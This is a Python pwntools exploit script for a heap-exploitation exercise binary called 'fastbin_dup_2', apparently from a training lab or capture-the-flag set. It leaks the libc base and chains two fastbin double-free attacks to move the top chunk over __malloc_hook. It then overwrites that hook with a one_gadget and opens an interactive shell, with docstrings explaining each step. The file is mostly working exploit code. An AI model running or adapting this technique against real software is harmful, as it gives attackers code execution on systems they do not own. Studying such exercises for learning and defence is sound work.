#!/usr/bin/env python2.7


from pwn import *

BINARY = './fastbin_dup_2'
LIBC = './libc.so.6'
ADDR = 'localhost'
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)

# Global index variable to keep track of allocated chunks
INDEX = 0
# one_gadget found in this version of glibc using david942j/one_gadget
ONE_GADGET_OFFSET = 0xe1fa1


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    if args.PWNDBG:
        context.log_level = 'debug'
        context.terminal = ['tmux', 'splitw', '-h']
        return gdb.debug(elf.path, gdbscript='''init-pwndbg''')

    else:
        return remote(ADDR, PORT)


def malloc(io, size, data):
    global INDEX

    io.send("1")
    io.sendafter("size: ", str(size))
    io.sendafter("data: ", data)
    io.recvuntil("> ")

    INDEX += 1
    return (INDEX - 1)


def free(io, index):
    io.send("2")
    io.sendafter("index: ", str(index))
    io.recvuntil("> ")


def solve():
    io = conn()
    io.timeout = 0.1

    io.recvuntil("puts() @ ")
    libc.address = int(io.recvline(), 16) - libc.sym.puts
    log.info("puts() found at: " + hex(libc.sym.puts))
    log.info("libc base found at: " + hex(libc.address))
    one_gadget = libc.address + ONE_GADGET_OFFSET
    log.info("one_gadget found at: " + hex(one_gadget))

    """
    This is our first fastbin dup attack. Using this double free, we link a
    chunk twice into the fastbin. After the double free, we allocate the double
    free'd chunk and write to it's user data which also contains the fd
    pointer for the original chunk. We write a fake size to the fd pointer and
    free until this fd pointer is at the top of the fastbin list in the arena.
    Now we have a fake size field of 0x61 in the arena.
    """
    dup = malloc(io, 0x48, cyclic(0x48, n=8))
    safety = malloc(io, 0x48, cyclic(0x48, n=8))

    free(io, dup)
    free(io, safety)
    free(io, dup)

    malloc(io, 0x48, flat(0x61))
    malloc(io, 0x48, cyclic(0x48, n=8))
    malloc(io, 0x48, cyclic(0x48, n=8))

    """
    This is our second fastbin dup attack. We use a double free to link a 0x60
    sized chunk into the fastbin, twice. After the double free, our first
    allocation writes the address of the main arena + 0x20. Using this address,
    we will later create a chunk in the main arena using the fake chunk size
    from our previous 0x50 fastbin dup. Allocating a couple more times, our
    0x60 fastbin now points to a chunk in the main arena.
    """
    dup = malloc(io, 0x58, cyclic(0x58, n=8))
    safety = malloc(io, 0x58, cyclic(0x58, n=8))

    free(io, dup)
    free(io, safety)
    free(io, dup)

    malloc(io, 0x58, flat(libc.sym.main_arena + 0x20))
    # -s is provided to our one_gadget as an argument for /bin/sh
    malloc(io, 0x58, "-s\0")
    malloc(io, 0x58, cyclic(0x58, n=8))

    """
    We allocate our 0x60 size chunk in the main arena and overwrite the top
    chunk pointer. We overwrite the top chunk pointer to point to a location
    in memory that resides above the __malloc_hook. We also make sure the new
    top chunk pointer location contains a valid size for the top chunk.
    """
    payload = [
        0,
        0,
        0,
        0,
        0,
        0,
        libc.sym.__malloc_hook - 0x24
    ]
    malloc(io, 0x58, flat(payload))

    """
    Now that our top chunk resides over the __malloc_hook, when we request a
    brand new chunk, this chunk will be able to overwrite the __malloc_hook.
    """
    payload = [
        cyclic(cyclic_find(0x6161616461616161, n=8), n=8),
        one_gadget
    ]
    malloc(io, 0x28, flat(payload))

    # Call malloc which executes our one_gadget
    malloc(io, 0x18, "")
    io.interactive()


if __name__ == "__main__":
    solve()
